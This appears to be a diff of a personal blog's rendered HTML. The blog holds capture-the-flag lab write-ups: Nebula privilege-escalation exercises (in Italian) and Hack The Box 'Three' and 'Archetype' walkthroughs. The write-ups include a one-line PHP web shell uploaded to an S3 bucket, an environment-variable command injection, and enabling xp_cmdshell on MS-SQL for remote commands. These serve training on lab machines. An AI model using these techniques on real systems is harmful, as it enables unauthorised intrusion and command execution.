+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">setresuid<span style="color:#f92672">(</span>-1, privileged_ID, -1<span style="color:#f92672">)</span>;
 </code></pre></div><p>In generale non viene mai acceso il SETUID su una shell, altrimenti le conseguenze potrebbero
 essere gravi.
 Ricorda che quando un file (con SETUID acceso) viene copiato, il SETUID/SETGID viene automaticamente
@@ -1716,7 +1716,7 @@ SETGID, in modo da impedire l&rsquo;aggancio del programma tracciante al program
 <p>Per cambiare il layout della tastiera, loggare come nebula (password nebula),
 usare il comando <strong>loadkeys it</strong> poi loggare come flag00.</p>
 <p>Per verificare l&rsquo;id di un utente, usare il comando <strong>id &lt;nomeutente&gt;</strong></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">find / -perm -4000 -exec ls -l <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span> 2&gt;/dev/null | grep level00
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">find / -perm -4000 -exec ls -l <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span> 2&gt;/dev/null | grep level00
 /bin/.../flag00
 getflag
 
@@ -1730,7 +1730,7 @@ ps -p <span style="color:#66d9ef">$(</span>pidof /bin/.../flag00<span style="col
 <p>Materiale utile</p>
 <p>Per una visione più completa sulle chiamate di sistema, consultare
 il materiale al seguente link:</p>
-<pre><code class="language-example" data-lang="example">https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwiAjbn0n736AhWQYPEDHUYGBXMQFnoECAUQAQ&amp;url=https%3A%2F%2Fweblab.ing.unimore.it%2Fpeople%2Fandreoli%2Fdidattica%2Fsistemi-operativi%2F2014-15%2F7-chiamate-sistema%2F7-chiamate-sistema.pdf&amp;usg=AOvVaw1UkLh5mnZwXHESHHGBfB1e
+<pre tabindex="0"><code class="language-example" data-lang="example">https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwiAjbn0n736AhWQYPEDHUYGBXMQFnoECAUQAQ&amp;url=https%3A%2F%2Fweblab.ing.unimore.it%2Fpeople%2Fandreoli%2Fdidattica%2Fsistemi-operativi%2F2014-15%2F7-chiamate-sistema%2F7-chiamate-sistema.pdf&amp;usg=AOvVaw1UkLh5mnZwXHESHHGBfB1e
 </code></pre><hr>
 </li>
 </ul>
@@ -1780,7 +1780,7 @@ maggior parte dei casi.</p>
 <p>Local Injection (1/2), Lv.1 Nebula</p>
 <p>Analizzando il codice fornito sul sito, ci si accorge che esegue un operazione
 sospetta (esegue system()) dopo aver aumentato i suoi privilegi.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
@@ -1822,7 +1822,7 @@ prima dell&rsquo;esecuzione del comando critico.
 <ul>
 <li>
 <p>Local Injection (2/2), Lv.2 Nebula</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
@@ -1852,7 +1852,7 @@ prima dell&rsquo;esecuzione del comando critico.
 che esegue un comando che dipende dal contenuto della varabile &ldquo;buffer&rdquo;.
 Esso dipende a sua volta dalla variabile d&rsquo;ambiente USER, che può essere
 facilmente modificata nel modo seguente:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">USER<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;hacked;/tmp/getflag;&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">USER<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;hacked;/tmp/getflag;&#39;</span>
 </code></pre></div><p>Basta poi copiare /bin/getflag in /tmp/getflag per ottenere l&rsquo;esecuzione
 del programma con privilegi elevati. Questo problema può essere risolto
 analogamente al precedente.</p>
@@ -1880,12 +1880,12 @@ usefull if they are just starting with penetration-testing.</p>
 <h4 id="connect-to-htb">Connect to htb<a href="#connect-to-htb" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
 <p>To connect to your hack the box account, you need <strong>openvpn</strong>.
 You can install it easily using the following comand:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo apt install openvpn
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo apt install openvpn
 </code></pre></div><p>After that, you have to download the .ovpn file from the
 htb website. Click on &ldquo;connect to htb&rdquo;, then click on &ldquo;Starting Point&rdquo;.
 Select &ldquo;TCP&rdquo; as protocol and just download the file.</p>
 <p>Now you are ready to connect using the following comand:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo openvpn &lt;filename.ovpn&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo openvpn &lt;filename.ovpn&gt;
 </code></pre></div><h4 id="preparation">Preparation<a href="#preparation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
 <p>After you connected to htb using <strong>openvpn</strong>, you can
 <strong>spawn the machine</strong> by clicking on the yellow button.</p>
@@ -1899,19 +1899,19 @@ Select &ldquo;TCP&rdquo; as protocol and just download the file.</p>
 <p>Now the IP adress of the machine should pop up.
 It is really important to save it in your /etc/hosts file.
 You can do it by adding the following line to the file:</p>
-<pre><code class="language-example" data-lang="example">&lt;ip_addr&gt;    three
+<pre tabindex="0"><code class="language-example" data-lang="example">&lt;ip_addr&gt;    three
 </code></pre><p>Now you can test if the host is up and running.</p>
 <p>Just use the <strong>ping</strong> command:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ping three
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ping three
 </code></pre></div><h4 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
 <p>As it&rsquo;s well known, to begin a penetration test it is always
 important to scan the target. I generally use <strong>nmap</strong> with a couple
 of flags, as shown below:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sC -sV three
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sC -sV three
 </code></pre></div><p>This basic scan will launch a series of default scripts and
 will provide more information on the versions of the services
 that are running on open ports. Here&rsquo;s the output that I got:</p>
-<pre><code class="language-example" data-lang="example">Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-15 10:14 CEST
+<pre tabindex="0"><code class="language-example" data-lang="example">Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-15 10:14 CEST
 Nmap scan report for three (10.129.101.217)
 Host is up (0.22s latency).
 Not shown: 998 closed tcp ports (reset)
@@ -1940,7 +1940,7 @@ Always play around with the web-page to discover vulnerabilites.</p>
 
 <p>As the hint says, let&rsquo;s edit our /etc/hosts file, editing
 the line that we added before:</p>
-<pre><code class="language-example" data-lang="example">&lt;ip_addr&gt;    thetoppers.htb
+<pre tabindex="0"><code class="language-example" data-lang="example">&lt;ip_addr&gt;    thetoppers.htb
 </code></pre><h4 id="gobuster">Gobuster<a href="#gobuster" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
 <p>Performing a in-depth search of hidden (non-protected) files
 and resources of a website is often a good starting point
@@ -1965,11 +1965,11 @@ that we have to find before the url.</p>
 <p>The simplest thing to do here is generating all the permutations of 2-character words.
 (including lowercase letters and numeric characters from 1 to 9).
 We can do that by using a tool called crunch (pre-installed on kali linux):</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">crunch <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">2</span> abcdefghijklmnopqrstuvwxyz0123456789 &gt; output.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">crunch <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">2</span> abcdefghijklmnopqrstuvwxyz0123456789 &gt; output.txt
 </code></pre></div><p>Now we are ready to use gobuster in vhost mode (it will look
 for subdomains by visiting the generated URLs).</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo gobuster vhost -u http://thetoppers.htb -w /home/matte/output.txt
-</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">===============================================================
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo gobuster vhost -u http://thetoppers.htb -w /home/matte/output.txt
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
 ===============================================================
@@ -1991,7 +1991,7 @@ Found: s3.thetoppers.htb (Status: 502) [Size: 424]
 Let&rsquo;s add it to our /etc/hosts file, editing
 the same line as before.
 Here&rsquo;s how my /etc/hosts file looks after this edit:</p>
-<pre><code class="language-example" data-lang="example">127.0.0.1       localhost
+<pre tabindex="0"><code class="language-example" data-lang="example">127.0.0.1       localhost
 127.0.1.1       kali
 10.129.101.217  thetoppers.htb s3.thetoppers.htb
 </code></pre><h4 id="aws">AWS<a href="#aws" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
@@ -2014,7 +2014,7 @@ Let&rsquo;s do it to see if this is the case.</p>
 <p>Use the following command to open an interactive menu
 to setup your credentials (you can type random words. If
 you don&rsquo;t, the connection will not work properly).</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">aws configure
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">aws configure
 </code></pre></div><p>What we can do now is try to see if we can list the buckets
 that are hosted. We have to specify:</p>
 <ol>
@@ -2022,16 +2022,16 @@ that are hosted. We have to specify:</p>
 <li>The command that we want to use, in this case <strong>ls</strong>;</li>
 </ol>
 <!-- raw HTML omitted -->
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">aws --endpoint<span style="color:#f92672">=</span>http://s3.thetoppers.htb s3 ls
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">aws --endpoint<span style="color:#f92672">=</span>http://s3.thetoppers.htb s3 ls
 </code></pre></div><p>Here&rsquo;s the output that we get:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">2022-09-15 10:33:39 thetoppers.htb
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">2022-09-15 10:33:39 thetoppers.htb
 </code></pre></div><p>which means that there is an actual bucket hosted there.
 Let&rsquo;s try to list the content of that bucket, using
 this command (in this case we have to specify that we want
 to use the s3 protocol to get the objects inside that bucket):</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">aws --endpoint<span style="color:#f92672">=</span>http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">aws --endpoint<span style="color:#f92672">=</span>http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
 </code></pre></div><p>Here&rsquo;s the output that we get:</p>
-<pre><code class="language-example" data-lang="example">			   PRE images/
+<pre tabindex="0"><code class="language-example" data-lang="example">			   PRE images/
 2022-09-15 10:33:39          0 .htaccess
 2022-09-15 10:33:39      11952 index.php
 </code></pre><h4 id="php">PHP<a href="#php" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
@@ -2042,13 +2042,13 @@ in the bucket, by using the <strong>cp</strong> command, that takes
 a local file as the input.
 I wrote the most basic shell you can have in php, this
 is the source code:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span> <span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#34;cmd&#34;</span>]); <span style="color:#75715e">?&gt;</span>
-</code></pre></div><p>Otherwise, you can find many reverse shell on this website:  <a href="https://www.revshells.com/">https://www.revshells.com/</a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#34;cmd&#34;</span>]); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>Otherwise, you can find many reverse shell on this website:  <a href="https://www.revshells.com/">https://www.revshells.com/</a>.</p>
 <p>Down below you can see how you can copy a file inside a bucket, you simply use <strong>cp</strong>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">aws --endpoint<span style="color:#f92672">=</span>http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">aws --endpoint<span style="color:#f92672">=</span>http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
 </code></pre></div><p>You can then re-run the list command to see that the shell was
 succesfully uploaded.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">                           PRE images/
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">                           PRE images/
 2022-09-15 10:33:39          0 .htaccess
 2022-09-15 10:33:39      11952 index.php
 2022-09-15 12:24:13         64 shell.php
@@ -2057,13 +2057,13 @@ succesfully uploaded.</p>
 can process, we can send remote commands by
 modifying and navigating to this URL:  <a href="http://thetoppers.htb/reverse.php?cmd">http://thetoppers.htb/reverse.php?cmd</a>=&lt;any_command&gt;.
 For example, you can list the files in the bucket like this:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">http://thetoppers.htb/reverse.php?cmd=ls+../
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">http://thetoppers.htb/reverse.php?cmd=ls+../
 </code></pre></div><p><strong><em>And there&rsquo;s the flag!</em></strong></p>
 <p>To actually see the content of the flag.txt file you can send this command:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">http://thetoppers.htb/reverse.php?cmd=cat+../flag.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">http://thetoppers.htb/reverse.php?cmd=cat+../flag.txt
 </code></pre></div><p>If the web-browser redirects you to some other web page,
 you can also use tools like <strong>wget</strong>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wget http://thetoppers.htb/reverse.php?cmd<span style="color:#f92672">=</span>cat+../flag.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wget http://thetoppers.htb/reverse.php?cmd<span style="color:#f92672">=</span>cat+../flag.txt
 </code></pre></div><blockquote>
 <p>root flag: a980d99281a28d638ac68b9bf9453c2b</p>
 </blockquote>
@@ -2086,7 +2086,7 @@ me at <strong><a href="mailto:matteolugli18@gmail.com">matteolugli18@gmail.com</
 <hr>
 <h4 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
 <p>I always start htb boxes with nmap enumeration.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sC -sV Archetype
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sC -sV Archetype
 Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-09-21 18:40 CEST
 Nmap scan report <span style="color:#66d9ef">for</span> Archetype <span style="color:#f92672">(</span>10.129.206.73<span style="color:#f92672">)</span>
 Host is up <span style="color:#f92672">(</span>0.59s latency<span style="color:#f92672">)</span>.
@@ -2165,7 +2165,7 @@ you are interested.</p>
 <h4 id="smb-client">SMB client<a href="#smb-client" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
 <p>Given what we discovered during enumeration, the simplest thing to
 try is connecting to the machine using SMB client.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smbclient -N -L Archetype
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smbclient -N -L Archetype
 
      Sharename       Type      Comment
      ---------       ----      -------
@@ -2182,7 +2182,7 @@ on a particular server.</li>
 </ul>
 <p>We notice the share called <strong>backups</strong>, which is the only non-admin share,
 that we might be able to access. Let&rsquo;s do it using this command:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smbclient -N <span style="color:#ae81ff">\\\\</span>Archetype<span style="color:#ae81ff">\\</span>backups
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smbclient -N <span style="color:#ae81ff">\\\\</span>Archetype<span style="color:#ae81ff">\\</span>backups
 smb: <span style="color:#ae81ff">\&gt;</span> ls
 ls
   .                                   D        <span style="color:#ae81ff">0</span>  Mon Jan <span style="color:#ae81ff">20</span> 13:20:57 <span style="color:#ae81ff">2020</span>
@@ -2192,7 +2192,7 @@ ls
 		<span style="color:#ae81ff">5056511</span> blocks of size 4096. <span style="color:#ae81ff">2616242</span> blocks available
 </code></pre></div><p>Looks like there is a suspicious file: prod.dtsConfig.
 Let&rsquo;s take a peek and check what&rsquo;s in there:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">get prod.dtsConfig
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">get prod.dtsConfig
 
 &lt;DTSConfiguration&gt;
     &lt;DTSConfigurationHeading&gt;
@@ -2213,7 +2213,7 @@ You can find the download links here</p>
 <p><a href="https://www.secureauth.com/labs/open-source-tools/impacket/">https://www.secureauth.com/labs/open-source-tools/impacket/</a></p>
 <p>At the beginning I struggled with finding the documentation for this tool, so i just runned
 the script with no options:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Impacket v0.9.24 - Copyright <span style="color:#ae81ff">2021</span> SecureAuth Corporation
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Impacket v0.9.24 - Copyright <span style="color:#ae81ff">2021</span> SecureAuth Corporation
 
 usage: mssqlclient.py <span style="color:#f92672">[</span>-h<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-port PORT<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-db DB<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-windows-auth<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-debug<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-file FILE<span style="color:#f92672">]</span>
 		      <span style="color:#f92672">[</span>-hashes LMHASH:NTHASH<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-no-pass<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-k<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-aesKey hex key<span style="color:#f92672">]</span>
@@ -2233,7 +2233,7 @@ options:
   -debug                Turn DEBUG output ON
   -file FILE            input file with commands to execute in the SQL shell
 </code></pre></div><p>After a little bit i figured out the correct way to write the command:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 mssqlclient.py Archetype/sql_svc@10.129.206.73 -windows-auth
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 mssqlclient.py Archetype/sql_svc@10.129.206.73 -windows-auth
 &lt;client.py Archetype/sql_svc@10.129.206.73 -windows-auth
 Impacket v0.9.24 - Copyright <span style="color:#ae81ff">2021</span> SecureAuth Corporation
 
@@ -2248,7 +2248,7 @@ Password:&lt;insert password&gt;
 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Press help <span style="color:#66d9ef">for</span> extra shell commands
 </code></pre></div><p>There we go, looks like we can send commands, so i tried
 to run a simple query:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">SQL&gt; <span style="color:#66d9ef">select</span> name from sys.databases
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">SQL&gt; <span style="color:#66d9ef">select</span> name from sys.databases
 master
 tempdb
 model
@@ -2257,7 +2257,7 @@ msdb
 <h4 id="command-shell">Command Shell<a href="#command-shell" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
 <p>I found out that there is a way to execute commands remotly if we have access
 to a ms-sql server: we can use a <em>stored procedure</em> called <strong>xp_cmdshell</strong>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#39;dir *.exe&#39;</span>;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#39;dir *.exe&#39;</span>;
 
 [<span style="color:#f92672">-</span>] ERROR(ARCHETYPE): Line <span style="color:#ae81ff">1</span>: <span style="color:#66d9ef">SQL</span> Server blocked <span style="color:#66d9ef">access</span> <span style="color:#66d9ef">to</span> <span style="color:#66d9ef">procedure</span> <span style="color:#e6db74">&#39;sys.xp_cmdshell&#39;</span>
 <span style="color:#66d9ef">of</span> component <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span> because this component <span style="color:#66d9ef">is</span> turned <span style="color:#66d9ef">off</span> <span style="color:#66d9ef">as</span> part <span style="color:#66d9ef">of</span> the <span style="color:#66d9ef">security</span> configuration <span style="color:#66d9ef">for</span> this server.
@@ -2269,7 +2269,7 @@ is disabled in the configuration file. Let&rsquo;s try to follow the suggestion
 given by the error prompt ('[&hellip;] <em>A system administrator can enable the use of &lsquo;xp_cmdshell&rsquo; by using sp_configure</em>.').</p>
 <p>With a quick google search i found out the correct way of using <strong>sp_configure</strong> to
 enable the shell. (Maybie we are lucky and we can do it without admin privileges).</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">sp_configure <span style="color:#e6db74">&#39;show advanced options&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">sp_configure <span style="color:#e6db74">&#39;show advanced options&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>
 sp_configure <span style="color:#e6db74">&#39;show advanced options&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>
 [<span style="color:#f92672">*</span>] INFO(ARCHETYPE): Line <span style="color:#ae81ff">185</span>: Configuration <span style="color:#66d9ef">option</span> <span style="color:#e6db74">&#39;show advanced options&#39;</span> changed <span style="color:#66d9ef">from</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">to</span> <span style="color:#ae81ff">1</span>. Run the RECONFIGURE <span style="color:#66d9ef">statement</span> <span style="color:#66d9ef">to</span> install.
 <span style="color:#66d9ef">SQL</span><span style="color:#f92672">&gt;</span> reconfigure
@@ -2292,10 +2292,10 @@ with <em>privilege escalation</em> on windows machines.
 It was originally made to enumerate all the possible ways or methods to get admin privileges on a Windows machine.
 To install it on kali or any debian-based distribution you can use the following
 command:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo apt install peass
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo apt install peass
 </code></pre></div><p>Use this other command to locate all the executable files that you
 just downloaded:</p>
